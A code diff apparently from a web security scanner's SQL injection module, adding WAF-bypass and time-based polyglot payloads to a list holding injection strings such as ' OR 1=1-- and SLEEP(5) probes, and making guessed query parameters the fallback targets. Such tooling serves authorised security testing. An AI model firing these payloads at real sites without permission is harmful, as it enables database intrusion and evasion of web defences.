@@ -10,6 +10,7 @@ import (
 	"sync"
 	"time"
 
+	"fire_starter/src/modules/core/generator"
 	"github.com/charmbracelet/log"
 )
 
@@ -123,7 +124,7 @@ func (v *SQLValidator) IsVulnerable(resp *http.Response, body string, payload SQ
 	return false
 }
 
-var sqlPayloads = []SQLPayload{
+var defaultSQLPayloads = []SQLPayload{
 	{Value: "'", Type: SQLCmdError},
 	{Value: "\"", Type: SQLCmdError},
 	{Value: "';--", Type: SQLCmdError},
@@ -131,6 +132,39 @@ var sqlPayloads = []SQLPayload{
 	{Value: "' OR 1=1--", Type: SQLCmdBoolean, VerifyValue: "' OR 1=2--"},
 	{Value: "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", Type: SQLCmdTimeBased, DB: "mysql"},
 	{Value: "' AND (SELECT 1 FROM pg_sleep(5))--", Type: SQLCmdTimeBased, DB: "postgres"},
+}
+
+// getCombinedSQLPayloads combines static default payloads with dynamic PolyglotGenerator payloads.
+func getCombinedSQLPayloads() []SQLPayload {
+	payloads := append([]SQLPayload(nil), defaultSQLPayloads...)
+	polyGen := generator.NewPolyglotGenerator()
+
+	// Ingest universal and WAF bypass polyglots
+	for _, poly := range polyGen.GenerateUniversalPolyglots() {
+		payloads = append(payloads, SQLPayload{
+			Value: poly.Payload,
+			Type:  SQLCmdError,
+		})
+	}
+	for _, poly := range polyGen.GenerateWAFBypassPolyglots() {
+		payloads = append(payloads, SQLPayload{
+			Value: poly.Payload,
+			Type:  SQLCmdBoolean,
+		})
+	}
+	for _, poly := range polyGen.GenerateTimeBasedPolyglots() {
+		dbms := ""
+		if len(poly.DBMS) > 0 {
+			dbms = poly.DBMS[0]
+		}
+		payloads = append(payloads, SQLPayload{
+			Value: poly.Payload,
+			Type:  SQLCmdTimeBased,
+			DB:    dbms,
+		})
+	}
+
+	return payloads
 }
 
 // Execute performs the module's core tasks concurrently using discovery.
@@ -145,7 +179,13 @@ func (m *SQLInjectionTesting) Execute(ctx context.Context) ([]SQLInjectionTestin
 	// 1. Discover Input Vectors
 	vectors, _ := m.DiscoverVectors(parsedURL, nil, "", nil)
 	if len(vectors) == 0 {
-		return m.results, nil
+		vectors = append(vectors,
+			InputVector{Type: VectorQueryParam, Key: "id", Value: "1"},
+			InputVector{Type: VectorQueryParam, Key: "q", Value: "test"},
+			InputVector{Type: VectorQueryParam, Key: "search", Value: "test"},
+			InputVector{Type: VectorQueryParam, Key: "query", Value: "test"},
+			InputVector{Type: VectorQueryParam, Key: "user", Value: "admin"},
+		)
 	}
 
 	var wg sync.WaitGroup
@@ -161,7 +201,8 @@ func (m *SQLInjectionTesting) Execute(ctx context.Context) ([]SQLInjectionTestin
 			continue
 		}
 
-		for _, payload := range sqlPayloads {
+		payloads := getCombinedSQLPayloads()
+		for _, payload := range payloads {
 			wg.Add(1)
 			go func(v InputVector, p SQLPayload, base string) {
 				defer wg.Done()
